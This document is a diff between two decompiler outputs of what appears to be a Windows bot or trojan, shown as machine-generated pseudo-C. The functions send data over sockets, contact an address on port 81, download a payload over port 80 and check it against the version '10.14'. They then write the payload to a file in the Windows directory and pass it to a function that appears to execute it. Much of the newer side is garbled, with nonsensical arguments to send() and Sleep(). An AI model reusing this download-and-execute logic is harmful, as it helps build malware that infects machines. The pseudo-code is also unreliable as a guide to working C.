+int32_t function_401e4c(int32_t a1, int32_t a2) {
     int32_t v1 = 0; // ebx
-    int32_t result;
+    char * str2 = (char *)g7; // 0x401e53
+    char * str = (char *)g5; // bp-12
+    int32_t v2 = (int32_t)&str; // 0x401e54
+    int32_t v3; // 0x401e79
     if (a2 > 0) {
-        int32_t str2 = (int32_t)&g64; // esi
-        int32_t len; // 0x401e7e
-        int32_t v2; // 0x401e86
-        if (strcmp((char *)str, (char *)&g64) != 0) {
-            while (true) {
-                int32_t v3 = v1 + 1; // 0x401e70
-                v1 = v3;
-                if (v3 >= a2) {
-                    // 0x401e77
-                    // branch -> 0x401e79
-                    // 0x401e79
-                    return 0;
-                }
-                // 0x401e70
-                if (strcmp((char *)(v3 + str), (char *)str2) == 0) {
-                    // break -> 0x401e7d
-                    break;
-                }
-                // continue -> 0x401e70
+        int32_t v4 = (int32_t)&g68; // esi
+        int32_t v5 = v2; // 0x401e63
+        int32_t v6 = (int32_t)&g68; // 0x401e63
+        int32_t v7 = 0; // 0x401e60
+        // branch -> 0x401e60
+        while (true) {
+            // 0x401e60
+            *(int32_t *)(v5 - 4) = v6;
+            *(int32_t *)(v5 - 8) = v7 + a1;
+            int32_t v8 = g8 + 8; // 0x401e6d
+            if (strcmp(str, str2) == 0) {
+                // 0x401e7d
+                *(int32_t *)(g8 + 4) = v4;
+                int32_t v9 = *(int32_t *)(v1 + strlen(str) + 1 + a1); // 0x401e86
+                v3 = g8 + 4;
+                // branch -> 0x401e79
+                // 0x401e79
+                g7 = *(int32_t *)(v3 + 4);
+                g3 = *(int32_t *)(v3 + 8);
+                return v9 == g38;
             }
-            // 0x401e7d
-            len = strlen((char *)str2);
-            v2 = *(int32_t *)(v1 + len + 1 + str);
-            // branch -> 0x401e79
-            // 0x401e79
-            return v2 == (int32_t)g36;
+            int32_t v10 = v1 + 1; // 0x401e70
+            v1 = v10;
+            if (v10 >= *(int32_t *)(g8 + 28)) {
+                // 0x401e77
+                v3 = v8;
+                // branch -> 0x401e79
+                // 0x401e79
+                g7 = *(int32_t *)(v3 + 4);
+                g3 = *(int32_t *)(v3 + 8);
+                return 0;
+            }
+            // 0x401e70
+            v5 = v8;
+            v6 = v4;
+            v7 = v10;
+            // branch -> 0x401e60
         }
-        // 0x401e7d
-        len = strlen((char *)str2);
-        v2 = *(int32_t *)(v1 + len + 1 + str);
-        result = v2 == (int32_t)g36;
-        // branch -> 0x401e79
     } else {
         // 0x401e77
-        result = 0;
+        v3 = v2;
         // branch -> 0x401e79
     }
     // 0x401e79
-    return result;
+    g7 = *(int32_t *)(v3 + 4);
+    g3 = *(int32_t *)(v3 + 8);
+    return 0;
 }
 
-// Address range: 0x401e99 - 0x401f44
-int32_t function_401e99(char * a1, int32_t a2) {
-    int32_t v1 = g2; // 0x401e9a
-    int32_t v2 = g6; // 0x401e9b
-    int32_t v3 = g5; // 0x401e9c
+// Address range: 0x401e99 - 0x401f45
+int32_t function_401e99(int32_t a1, int32_t a2) {
+    char * flags = "Kernel32.dll"; // bp-20
     int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x401ea2
-    int32_t func = (int32_t)GetProcAddress(moduleHandle, "GetTickCount"); // 0x401eb0
-    int32_t v4 = FreeLibrary(moduleHandle); // eax
-    int32_t v5 = 0; // ebx
-    int32_t v6 = 2 * (a2 + 0x3a98 + 4 * a2); // esi
-    struct _PROCESS_INFORMATION * v7 = (struct _PROCESS_INFORMATION *)0x401ed0; // bp-20
-    __pseudo_call(func);
-    int32_t v8 = 0; // ebp
-    g33 = v4;
+    GetProcAddress(moduleHandle, "GetTickCount");
+    int32_t sock = (int32_t)moduleHandle; // bp-32
+    int32_t v1 = FreeLibrary(moduleHandle); // 0x401eb9
+    int32_t v2 = 0; // ebx
+    int32_t v3 = 2 * (g2 + 0x3a98 + 4 * g2); // esi
+    int32_t v4 = 0; // ebp
+    g35 = v1;
+    int32_t v5; // 0x401f33
+    int32_t v6; // 0x401f36
     int32_t result; // 0x401f3a
-    if (a2 > 0) {
+    if (g2 > 0) {
         // 0x401edb
-        if (g24 == 0) {
-            int32_t v9 = v5; // 0x401ee6
-            int32_t flags = 0; // 0x401ee524
-            int32_t v10 = a2; // 0x401ee323
-            // branch -> 0x401ee3
+        if (g26 == 0) {
+            int32_t v7 = 0; // 0x401ee530
+            int32_t v8 = g2; // 0x401ee329
             while (true) {
-                int32_t buf = v9 + (int32_t)a1; // 0x401eed
-                int32_t sock = *(int32_t *)&g34; // 0x401ef02
-                int32_t v11 = send(sock, (char *)buf, v10 - v9, flags); // 0x401ef6
-                int32_t v12; // 0x401f2f
-                int32_t v13; // 0x401f1f
-                if (v11 == -1) {
+                // 0x401ee3
+                *(int32_t *)(g8 - 4) = v7;
+                *(int32_t *)(g8 - 8) = v8 - v2;
+                *(int32_t *)(g8 - 12) = v2 + *(int32_t *)(g8 + 20);
+                *(int32_t *)(g8 - 16) = (int32_t)g36;
+                int32_t v9 = send(sock, (char *)moduleHandle, (int32_t)"GetTickCount", (int32_t)flags); // 0x401ef6
+                int32_t v10; // 0x401f2f
+                int32_t v11; // 0x401f1f
+                if (v9 == -1) {
                     // 0x401f01
                     if (WSAGetLastError() == 0x2733) {
                         // 0x401f0e
-                        Sleep(1);
-                        int32_t v14 = v6; // 0x401f16
-                        v6 = v14 - 1;
-                        if (v14 != 0) {
+                        *(int32_t *)(g8 - 4) = 1;
+                        Sleep(sock);
+                        int32_t v12 = v3; // 0x401f16
+                        v3 = v12 - 1;
+                        if (v12 != 0) {
                             // 0x401f0e
-                            v12 = a2;
-                            v13 = v5;
+                            v10 = g2;
+                            v11 = v2;
                             // branch -> 0x401f2f
                             goto lab_0x401f2f;
                         }
                     }
                     // 0x401f3b
-                    g66 = (struct _OVERLAPPED *)v8;
+                    g71 = v4;
                     // branch -> 0x401f41
                     // 0x401f41
+                    v6 = g8;
                     // branch -> 0x401f36
                     // 0x401f36
-                    g5 = (int32_t)v7;
-                    g6 = v3;
-                    g2 = v2;
-                    g3 = v1;
+                    g5 = *(int32_t *)v6;
+                    g7 = *(int32_t *)(v6 + 4);
+                    g2 = *(int32_t *)(v6 + 8);
+                    g3 = *(int32_t *)(v6 + 12);
                     return 0;
                 }
                 // 0x401f1f
-                v13 = v5 + v11;
-                v5 = v13;
-                v6 = 10 * (a2 - v13 + 3000);
-                v12 = a2;
+                v11 = v2 + v9;
+                v2 = v11;
+                v3 = 10 * (g2 - v11 + 3000);
+                v10 = g2;
                 // branch -> 0x401f2f
               lab_0x401f2f:
                 // 0x401f2f
-                if (v13 >= v12) {
+                if (v11 >= v10) {
                     // 0x401f33
+                    v5 = g8;
+                    *(int32_t *)(v5 - 4) = 1;
+                    v6 = v5;
                     // branch -> 0x401f36
                     // 0x401f36
-                    g5 = (int32_t)v7;
-                    g6 = v3;
-                    g2 = v2;
-                    g3 = v1;
+                    g5 = *(int32_t *)v6;
+                    g7 = *(int32_t *)(v6 + 4);
+                    g2 = *(int32_t *)(v6 + 8);
+                    g3 = *(int32_t *)(v6 + 12);
                     return 1;
                 }
                 // 0x401f2f
-                if (g24 != v8) {
+                if (g26 != v4) {
                     // break -> 0x401f41
                     break;
                 }
-                v9 = v13;
-                flags = v8;
-                v10 = v12;
+                v7 = v4;
+                v8 = v10;
                 // continue -> 0x401ee3
                 continue;
             }
             // 0x401f41
+            v6 = g8;
             // branch -> 0x401f36
             // 0x401f36
-            g5 = (int32_t)v7;
-            g6 = v3;
-            g2 = v2;
-            g3 = v1;
+            g5 = *(int32_t *)v6;
+            g7 = *(int32_t *)(v6 + 4);
+            g2 = *(int32_t *)(v6 + 8);
+            g3 = *(int32_t *)(v6 + 12);
             return 0;
         }
         // 0x401f41
+        v6 = g8;
         result = 0;
         // branch -> 0x401f36
     } else {
         // 0x401f33
+        v5 = g8;
+        *(int32_t *)(v5 - 4) = 1;
+        v6 = v5;
         result = 1;
         // branch -> 0x401f36
     }
     // 0x401f36
-    g5 = (int32_t)v7;
-    g6 = v3;
-    g2 = v2;
-    g3 = v1;
+    g5 = *(int32_t *)v6;
+    g7 = *(int32_t *)(v6 + 4);
+    g2 = *(int32_t *)(v6 + 8);
+    g3 = *(int32_t *)(v6 + 12);
     return result;
 }
 
-// Address range: 0x401f45 - 0x402005
+// Address range: 0x401f45 - 0x402006
 int32_t function_401f45(char * a1, int32_t a2) {
     struct in_addr in; // 0x401fc0
-    int32_t v1 = g3; // 0x401f4e
-    int32_t v2 = g6; // 0x401f4f
-    g6 = (int32_t)a1;
+    // 0x401f45
+    int32_t v1; // bp-516
+    int32_t v2 = &v1; // 0x401f48
+    int32_t v3 = g3; // 0x401f4e
+    int32_t v4 = g7; // bp-524
+    int32_t v5 = &v4; // 0x401f4f
+    g7 = (int32_t)a1;
     g3 = 0;
-    int32_t str; // bp-516
+    int32_t v6 = v5; // 0x401f99
+    char * str; // bp-528
+    int32_t v7; // 0x401fab
+    int32_t v8; // 0x401fec
+    int32_t v9; // 0x402000
+    int32_t v10; // 0x402002
     int32_t result; // 0x402005
-    int32_t v3; // 0x401fae
+    int32_t v11; // 0x401fc6
+    int32_t v12; // 0x401fdf
+    char * v13; // 0x401fc0
     int32_t len; // 0x401fda
-    char * v4; // 0x401fc0
+    int32_t v14; // 0x401fe7
+    int32_t result2; // 0x401ffb
     if (*a1 == 65) {
         // 0x401f99
-        memset(&str, 0, 512);
-        v3 = *(int32_t *)(g6 + 1);
+        *(int32_t *)(v6 - 4) = 512;
+        *(int32_t *)(v6 - 8) = g3;
+        *(int32_t *)(v6 - 12) = v2;
+        memset((int32_t *)str, v4, v3);
+        v7 = g8;
+        *(int32_t *)(v7 + 8) = *(int32_t *)(g7 + 1);
+        *(int32_t *)(v7 + 4) = 1;
+        *(int32_t *)v7 = (int32_t)&g74;
+        *(int32_t *)(v7 - 4) = 81;
+        *(int32_t *)(v7 - 8) = (int32_t)g39;
         in = (struct in_addr){
             .e0 = 0
         };
-        in.e0 = g37;
-        v4 = inet_ntoa(in);
-        function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
-        len = strlen((char *)&str);
-        if (function_401e99((char *)&str, len) != 0) {
+        in.e0 = (int32_t)str;
+        v13 = inet_ntoa(in);
+        v11 = g8;
+        *(int32_t *)(v11 - 4) = (int32_t)v13;
+        *(int32_t *)(v11 - 8) = v2;
+        function_40267d(str, v4);
+        *(int32_t *)(g8 - 4) = v2;
+        len = strlen(str);
+        v12 = g8;
+        *(int32_t *)(v12 - 4) = len;
+        *(int32_t *)(v12 - 8) = v2;
+        v14 = function_401e99((int32_t)str, v4);
+        v8 = g8;
+        if (v14 != 0) {
             // 0x401ff7
-            result = function_401e99((char *)g6, a2);
+            *(int32_t *)(v8 + 32) = a2;
+            *(int32_t *)(v8 + 28) = g7;
+            result2 = function_401e99((int32_t)str, v4);
+            v9 = g8;
+            g4 = *(int32_t *)(v9 + 4);
+            result = result2;
+            v10 = v9 + 8;
             // branch -> 0x402002
         } else {
             // 0x401ff3
             result = 0;
+            v10 = v8 + 36;
             // branch -> 0x402002
         }
         // 0x402002
-        g6 = v2;
-        g3 = v1;
+        g7 = *(int32_t *)v10;
+        g3 = *(int32_t *)(v10 + 4);
         return result;
     }
     // 0x401f5a
-    if (g53 == NULL) {
-        // 0x401f99
-        memset(&str, 0, 512);
-        v3 = *(int32_t *)(g6 + 1);
-        in = (struct in_addr){
-            .e0 = 0
-        };
-        in.e0 = g37;
-        v4 = inet_ntoa(in);
-        function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
-        len = strlen((char *)&str);
-        if (function_401e99((char *)&str, len) != 0) {
-            // 0x401ff7
-            result = function_401e99((char *)g6, a2);
-            // branch -> 0x402002
-        } else {
-            // 0x401ff3
-            result = 0;
-            // branch -> 0x402002
-        }
-        // 0x402002
-        g6 = v2;
-        g3 = v1;
-        return result;
-    }
-    // 0x401f62
-    g52 = 1;
-    g51 = 0;
-    closesocket(*(int32_t *)&g34);
-    int32_t result2; // 0x401ffb
-    if (g51 != g3) {
-        // 0x401f90
-        if (function_4028eb() != 0) {
-            // 0x401f90
-            // branch -> 0x401f99
-            // 0x401f99
-            memset(&str, g3, 512);
-            v3 = *(int32_t *)(g6 + 1);
-            in = (struct in_addr){
-                .e0 = 0
-            };
-            in.e0 = g37;
-            v4 = inet_ntoa(in);
-            function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
-            len = strlen((char *)&str);
-            if (function_401e99((char *)&str, len) != 0) {
-                // 0x401ff7
-                result2 = function_401e99((char *)g6, a2);
-                // branch -> 0x402002
-                // 0x402002
-                g6 = v2;
-                g3 = v1;
-                return result2;
+    if (g56 != 0) {
+        int32_t v15 = *(int32_t *)&g36; // 0x401f621
+        str = NULL;
+        *(int32_t *)&str = v15;
+        g54 = 1;
+        g53 = 0;
+        closesocket(v15);
+        int32_t v16; // 0x401f90
+        int32_t v17;
+        if (g53 == g3) {
+            *(int32_t *)(g8 - 4) = 1;
+            Sleep((int32_t)str);
+            while (g53 == g3) {
+                // 0x401f86
+                *(int32_t *)(g8 - 4) = 1;
+                Sleep((int32_t)str);
+                // continue -> 0x401f86
             }
-        }
-        // 0x401ff3
-        // branch -> 0x402002
-        // 0x402002
-        g6 = v2;
-        g3 = v1;
-        return 0;
-    }
-    Sleep(1);
-    while (g51 == g3) {
-        // 0x401f86
-        Sleep(1);
-        // continue -> 0x401f86
-    }
-    // 0x401f90
-    if (function_4028eb() != 0) {
-        // 0x401f90
-        // branch -> 0x401f99
-        // 0x401f99
-        str = 0;
-        memset(&str, g3, 512);
-        v3 = *(int32_t *)(g6 + 1);
-        in = (struct in_addr){
-            .e0 = 0
-        };
-        in.e0 = g37;
-        v4 = inet_ntoa(in);
-        function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
-        len = strlen((char *)&str);
-        if (function_401e99((char *)&str, len) != 0) {
-            // 0x401ff7
-            result2 = function_401e99((char *)g6, a2);
+            // 0x401f90
+            v16 = function_4028eb();
+            v17 = g8;
+            int32_t v18 = v17;
+            if (v16 != 0) {
+                v6 = v17;
+                // 0x401f99
+                *(int32_t *)(v6 - 4) = 512;
+                *(int32_t *)(v6 - 8) = g3;
+                *(int32_t *)(v6 - 12) = v2;
+                memset((int32_t *)str, v4, v3);
+                v7 = g8;
+                *(int32_t *)(v7 + 8) = *(int32_t *)(g7 + 1);
+                *(int32_t *)(v7 + 4) = 1;
+                *(int32_t *)v7 = (int32_t)&g74;
+                *(int32_t *)(v7 - 4) = 81;
+                *(int32_t *)(v7 - 8) = (int32_t)g39;
+                in = (struct in_addr){
+                    .e0 = 0
+                };
+                in.e0 = (int32_t)str;
+                v13 = inet_ntoa(in);
+                v11 = g8;
+                *(int32_t *)(v11 - 4) = (int32_t)v13;
+                *(int32_t *)(v11 - 8) = v2;
+                function_40267d(str, v4);
+                *(int32_t *)(g8 - 4) = v2;
+                len = strlen(str);
+                v12 = g8;
+                *(int32_t *)(v12 - 4) = len;
+                *(int32_t *)(v12 - 8) = v2;
+                v14 = function_401e99((int32_t)str, v4);
+                v8 = g8;
+                if (v14 != 0) {
+                    // 0x401ff7
+                    *(int32_t *)(v8 + 32) = a2;
+                    *(int32_t *)(v8 + 28) = g7;
+                    result2 = function_401e99((int32_t)str, v4);
+                    v9 = g8;
+                    g4 = *(int32_t *)(v9 + 4);
+                    v10 = v9 + 8;
+                    // branch -> 0x402002
+                    // 0x402002
+                    g7 = *(int32_t *)v10;
+                    g3 = *(int32_t *)(v10 + 4);
+                    return result2;
+                }
+                v18 = v8 + 36;
+            }
+            // 0x401ff3
+            v10 = v18;
             // branch -> 0x402002
             // 0x402002
-            g6 = v2;
-            g3 = v1;
-            return result2;
+            g7 = *(int32_t *)v10;
+            g3 = *(int32_t *)(v10 + 4);
+            return 0;
         }
+        // 0x401f90
+        v16 = function_4028eb();
+        v17 = g8;
+        if (v16 == 0) {
+            // 0x401ff3
+            v10 = v17;
+            // branch -> 0x402002
+            // 0x402002
+            g7 = *(int32_t *)v10;
+            g3 = *(int32_t *)(v10 + 4);
+            return 0;
+        }
+        v6 = v17;
+    } else {
+        v6 = v5;
     }
-    // 0x401ff3
-    // branch -> 0x402002
+    // 0x401f99
+    *(int32_t *)(v6 - 4) = 512;
+    *(int32_t *)(v6 - 8) = g3;
+    *(int32_t *)(v6 - 12) = v2;
+    memset((int32_t *)str, v4, v3);
+    v7 = g8;
+    *(int32_t *)(v7 + 8) = *(int32_t *)(g7 + 1);
+    *(int32_t *)(v7 + 4) = 1;
+    *(int32_t *)v7 = (int32_t)&g74;
+    *(int32_t *)(v7 - 4) = 81;
+    *(int32_t *)(v7 - 8) = (int32_t)g39;
+    in = (struct in_addr){
+        .e0 = 0
+    };
+    in.e0 = (int32_t)str;
+    v13 = inet_ntoa(in);
+    v11 = g8;
+    *(int32_t *)(v11 - 4) = (int32_t)v13;
+    *(int32_t *)(v11 - 8) = v2;
+    function_40267d(str, v4);
+    *(int32_t *)(g8 - 4) = v2;
+    len = strlen(str);
+    v12 = g8;
+    *(int32_t *)(v12 - 4) = len;
+    *(int32_t *)(v12 - 8) = v2;
+    v14 = function_401e99((int32_t)str, v4);
+    v8 = g8;
+    if (v14 != 0) {
+        // 0x401ff7
+        *(int32_t *)(v8 + 32) = a2;
+        *(int32_t *)(v8 + 28) = g7;
+        result2 = function_401e99((int32_t)str, v4);
+        v9 = g8;
+        g4 = *(int32_t *)(v9 + 4);
+        result = result2;
+        v10 = v9 + 8;
+        // branch -> 0x402002
+    } else {
+        // 0x401ff3
+        result = 0;
+        v10 = v8 + 36;
+        // branch -> 0x402002
+    }
     // 0x402002
-    g6 = v2;
-    g3 = v1;
-    return 0;
+    g7 = *(int32_t *)v10;
+    g3 = *(int32_t *)(v10 + 4);
+    return result;
 }
 
-// Address range: 0x402006 - 0x40205b
+// Address range: 0x402006 - 0x40205c
 int32_t function_402006(void) {
     int32_t v1 = g4; // bp-4
     int32_t v2 = g5; // 0x402007
@@ -1768,103 +2204,73 @@ int32_t function_402006(void) {
         g5 = v2;
         return result;
     }
-    int32_t v3 = g6; // 0x40201a
-    g6 = (int32_t)&g49;
-    int32_t v4 = function_4019e2((struct sockaddr *)&g49, 80, (int32_t)&g40, (int32_t)&g68, 0, result, (int32_t)&v1, 0); // 0x402037
-    if (v4 != 0) {
+    // 0x40201a
+    g7 = (int32_t)&g51;
+    int32_t v3 = function_4019e2((struct timeval *)&g51, 80, (int32_t)&g42, (int32_t)&g74, 0, result, (int32_t)&v1, 0); // 0x402037
+    if (v3 != 0) {
         // 0x402043
-        strcpy((char *)&g50, (char *)g6);
+        strcpy((char *)&g52, (char *)g7);
         // branch -> 0x402050
     }
     // 0x402050
     free(mem);
-    g6 = v3;
     // branch -> 0x402059
     // 0x402059
     g5 = v2;
-    int32_t * v5;
-    return (int32_t)&v5;
+    int32_t * v4;
+    return (int32_t)&v4;
 }
 
-// Address range: 0x40205c - 0x40216e
+// Address range: 0x40205c - 0x40216f
 int32_t function_40205c(void) {
     int32_t v1 = g2; // bp-4
     g2 = &v1;
-    int32_t v2 = g3; // 0x402065
     int32_t * mem = malloc(0x3e800); // 0x40206b
-    int32_t v3 = (int32_t)mem; // 0x40206b
+    int32_t v2 = (int32_t)mem; // 0x40206b
     g3 = 0;
-    struct _SECURITY_ATTRIBUTES * v4 = NULL; // bp-8
-    *(int32_t *)&v4 = v3;
     int32_t result; // 0x40216e
     if (mem != NULL) {
-        int32_t v5 = g6; // bp-1048
-        int32_t v6 = g5; // 0x402083
+        // 0x402082
         int32_t nNumberOfBytesToWrite; // bp-12
-        int32_t v7 = &nNumberOfBytesToWrite; // 0x402084
-        g4 = v7;
-        g5 = (int32_t)&g68;
-        g6 = (int32_t)&g50;
-        int32_t v8 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g45, (int32_t)&g68, 0, v3, v7, 0); // 0x40209e
-        if (v8 != 0) {
+        int32_t v3 = &nNumberOfBytesToWrite; // 0x402084
+        g4 = v3;
+        g5 = (int32_t)&g74;
+        g7 = (int32_t)&g52;
+        int32_t v4 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g47, (int32_t)&g74, 0, v2, v3, 0); // 0x40209e
+        int32_t v5; // bp-1116
+        if (v4 != 0) {
             // 0x4020ae
-            *(char *)(nNumberOfBytesToWrite + v3) = (char)g3;
-            struct _OVERLAPPED * str = (struct _OVERLAPPED *)"10.14"; // 0x4020bd
-            int32_t strcmp_rc = strcmp((char *)(struct _SECURITY_ATTRIBUTES *)mem, (char *)str); // 0x4020bd
-            g4 = (int32_t)str;
-            struct _SECURITY_ATTRIBUTES * v9; // 0x40215e
-            if (strcmp_rc == 0) {
-                // 0x4020ae
-                v9 = v4;
-                // branch -> 0x40215e
-            } else {
-                int32_t v10 = g3; // 0x4020cf
-                int32_t v11 = *(int32_t *)&v4; // 0x4020d111
-                struct _SECURITY_ATTRIBUTES * v12 = (struct _SECURITY_ATTRIBUTES *)v11;
-                int32_t v13 = function_4019e2((struct sockaddr *)g6, 80, (int32_t)&g44, g5, v10, v11, v7, v10); // 0x4020de
-                if (v13 != 0) {
-                    int32_t lpBuffer = 0; // bp-1040
+            *(char *)(nNumberOfBytesToWrite + v2) = (char)g3;
+            g4 = (int32_t)"10.14";
+            if (strcmp((char *)mem, "10.14") != 0) {
+                int32_t v6 = g3; // 0x4020cf
+                int32_t v7 = function_4019e2((struct timeval *)g7, 80, (int32_t)&g46, g5, v6, v2, v3, v6); // 0x4020de
+                if (v7 != 0) {
+                    // 0x4020ea
+                    int32_t lpBuffer; // bp-1040
                     GetWindowsDirectoryA((char *)&lpBuffer, 1024);
                     strcat((char *)&lpBuffer, "Xjapor_*ata");
                     int32_t dwShareMode = g3; // 0x402115
-                    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 2, 2, &((struct _OVERLAPPED *)dwShareMode)->e0); // 0x402122
-                    g6 = (int32_t)fileHandle;
+                    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 2, 2, (int32_t *)dwShareMode); // 0x402122
                     if (fileHandle != (int32_t *)-1) {
                         int32_t lpNumberOfBytesWritten = 0; // bp-16
-                        bool v14 = WriteFile(fileHandle, &v12->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x40213b
-                        g5 = v14;
-                        CloseHandle(&((struct _OVERLAPPED *)g6)->e0);
-                        if (g5 != g3) {
+                        bool v8 = WriteFile(fileHandle, mem, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x40213b
+                        CloseHandle((int32_t *)(int32_t)fileHandle);
+                        if ((int32_t)v8 != g3) {
                             // 0x40214e
-                            function_40511a((struct _STARTUPINFOA *)&lpBuffer);
+                            function_40511a((char *)&lpBuffer);
+                            v5 = 1;
                             g3 = 1;
-                            v9 = v12;
                             // branch -> 0x40215e
-                        } else {
-                            v9 = v12;
                         }
-                    } else {
-                        v9 = v12;
                     }
-                } else {
-                    v9 = v12;
                 }
             }
-            // 0x40215e
-            free(&v9->e0);
-            g5 = v6;
-            g6 = v5;
-            result = g3;
-            // branch -> 0x40216c
-            // 0x40216c
-            g3 = v2;
-            g2 = v1;
-            return result;
         }
         // 0x40215e
-        free(&((struct _SECURITY_ATTRIBUTES *)mem)->e0);
-        g5 = v6;
-        g6 = v5;
+        *(int32_t *)(g8 - 4) = v2;
+        free((int32_t *)v5);
+        g5 = *(int32_t *)(g8 + 4);
         result = g3;
         // branch -> 0x40216c
     } else {
@@ -1873,370 +2279,505 @@ int32_t function_40205c(void) {
         // branch -> 0x40216c
     }
     // 0x40216c
-    g3 = v2;
     g2 = v1;
     return result;
 }
 
-// Address range: 0x40216f - 0x4022ea
+// Address range: 0x40216f - 0x4022eb
 int32_t function_40216f(void) {
-    int32_t v1 = g2; // bp-4
-    g2 = &v1;
-    int32_t v2 = g3; // 0x402178
-    int32_t v3 = g6; // 0x402179
-    int32_t v4 = g5; // 0x40217a
+    int32_t dwShareMode = g2; // bp-4
+    g2 = &dwShareMode;
+    int32_t v1; // bp-1040
+    int32_t v2 = &v1; // 0x402172
+    int32_t v3 = g5; // bp-1052
+    int32_t v4 = &v3; // 0x40217a
     int32_t * mem = malloc(0x3e800); // 0x402180
     int32_t v5 = (int32_t)mem; // 0x402180
-    g6 = v5;
+    g7 = v5;
     g3 = 0;
-    g4 = (int32_t)(struct _OVERLAPPED *)0x3e800;
-    int32_t result2;
+    g4 = (int32_t)(char *)0x3e800;
+    int32_t result;
+    int32_t v6; // 0x4022e6
     if (mem == NULL) {
         // 0x4021f3
-        result2 = 0;
+        v6 = v4;
+        result = 0;
         // branch -> 0x4022e6
     } else {
         // 0x40218f
-        int32_t nNumberOfBytesToWrite; // bp-8
-        int32_t v6 = &nNumberOfBytesToWrite; // 0x40218f
-        char * str = (char *)&nNumberOfBytesToWrite; // bp-1060
-        g5 = (int32_t)&g68;
-        int32_t v7 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g39, (int32_t)&g68, 0, v5, v6, 0); // 0x4021a8
-        struct _OVERLAPPED * v8; // 0x4022dc
-        if (v7 != 0) {
-            struct _OVERLAPPED * str2 = (struct _OVERLAPPED *)"10.14"; // bp-1056
-            int32_t v9 = g6; // 0x4021c0
-            str = (char *)v9;
-            *(char *)(v9 + nNumberOfBytesToWrite) = (char)g3;
+        char * c; // bp-8
+        int32_t v7 = (int32_t)&c; // 0x40218f
+        g5 = (int32_t)&g74;
+        int32_t v8 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g41, (int32_t)&g74, 0, v5, v7, 0); // 0x4021a8
+        char * v9;
+        int32_t v10; // 0x4022e3
+        if (v8 != 0) {
+            char * str2 = "10.14"; // bp-1056
+            int32_t str = g7; // 0x4021c0
+            *(char *)(str + (int32_t)c) = (char)g3;
+            int32_t strcmp_rc = strcmp((char *)str, str2); // 0x4021c4
             g4 = (int32_t)str2;
-            if (strcmp(str, (char *)str2) != 0) {
-                int32_t v10 = g3; // 0x4021d6
-                str = (char *)&nNumberOfBytesToWrite;
-                int32_t v11 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g38, g5, v10, g6, v6, v10); // 0x4021e7
-                if (v11 != 0) {
-                    int32_t v12 = g6; // 0x4021fd
-                    g5 = v12 - 2;
-                    *(char *)(v12 + nNumberOfBytesToWrite) = (char)g3;
+            if (strcmp_rc != 0) {
+                int32_t v11 = g3; // 0x4021d6
+                int32_t v12 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g40, g5, v11, g7, v7, v11); // 0x4021e7
+                if (v12 != 0) {
+                    int32_t v13 = g7; // 0x4021fd
+                    g5 = v13 - 2;
+                    *(char *)(v13 + (int32_t)c) = (char)g3;
+                    char * v14 = v9;
                     // branch -> 0x402203
+                    int32_t v15; // edi
+                    int32_t hFile; // 0x40221e
+                    int32_t * v16; // 0x402241
+                    char * str3; // 0x40221e
                     while (true) {
-                        uint32_t v13 = g5; // 0x402208
-                        if (v13 < g6 + nNumberOfBytesToWrite) {
+                        uint32_t v17 = g5; // 0x402208
+                        if (v17 < g7 + (int32_t)c) {
                             // 0x402210
-                            if (v13 != g3) {
-                                int32_t str4 = v13 + 2; // 0x402218
-                                char * str3 = (char *)str4; // 0x40221d
-                                str = str3;
-                                char * found_char_pos = strchr(str3, 13); // 0x402221
-                                int32_t v14 = (int32_t)found_char_pos; // 0x402221
-                                g5 = v14;
-                                int32_t v15 = g3; // 0x40222a
-                                if (v14 != v15) {
+                            if (v17 != g3) {
+                                // 0x402218
+                                v15 = v17 + 2;
+                                *(int32_t *)(g8 - 4) = 13;
+                                *(int32_t *)(g8 - 8) = v15;
+                                hFile = v15;
+                                str3 = (char *)hFile;
+                                char * found_char_pos = strchr(str3, (int32_t)c); // 0x402221
+                                int32_t v18 = (int32_t)found_char_pos; // 0x402221
+                                g5 = v18;
+                                int32_t v19 = g3; // 0x40222a
+                                int32_t v20 = g8 + 8; // 0x402231
+                                if (v18 != v19) {
                                     // 0x40222f
-                                    *found_char_pos = (char)v15;
+                                    *found_char_pos = (char)v19;
+                                    v20 = g8;
                                     // branch -> 0x402231
                                 }
                                 // 0x402231
-                                *(int32_t *)&str = str4;
-                                int32_t strcmp_rc = strcmp((char *)str4, (char *)&g64); // 0x402239
-                                g4 = (int32_t)(struct _OVERLAPPED *)&g64;
-                                if (strcmp_rc == 0) {
+                                *(int32_t *)(v20 - 4) = (int32_t)&g68;
+                                *(int32_t *)(v20 - 8) = hFile;
+                                int32_t strcmp_rc2 = strcmp(str3, c); // 0x402239
+                                v16 = (int32_t *)(g8 + 4);
+                                g4 = *v16;
+                                if (strcmp_rc2 == 0) {
                                     // break -> 0x402244
                                     break;
                                 }
+                                v14 = str3;
                                 // continue -> 0x402203
                                 continue;
                             }
                         }
                         // 0x4022dc
-                        v8 = (struct _OVERLAPPED *)g6;
-                        free(&v8->e0);
-                        g4 = (int32_t)v8;
-                        int32_t result = g3; // 0x4022e4
+                        *(int32_t *)(g8 - 4) = g7;
+                        free((int32_t *)v14);
+                        v10 = g8;
+                        g4 = *(int32_t *)v10;
+                        v6 = v10 + 4;
+                        result = g3;
                         // branch -> 0x4022e6
                         // 0x4022e6
-                        g5 = v4;
-                        g6 = v3;
-                        g3 = v2;
-                        g2 = v1;
+                        g5 = *(int32_t *)v6;
+                        g7 = *(int32_t *)(v6 + 4);
+                        g3 = *(int32_t *)(v6 + 8);
+                        g2 = dwShareMode;
                         return result;
                     }
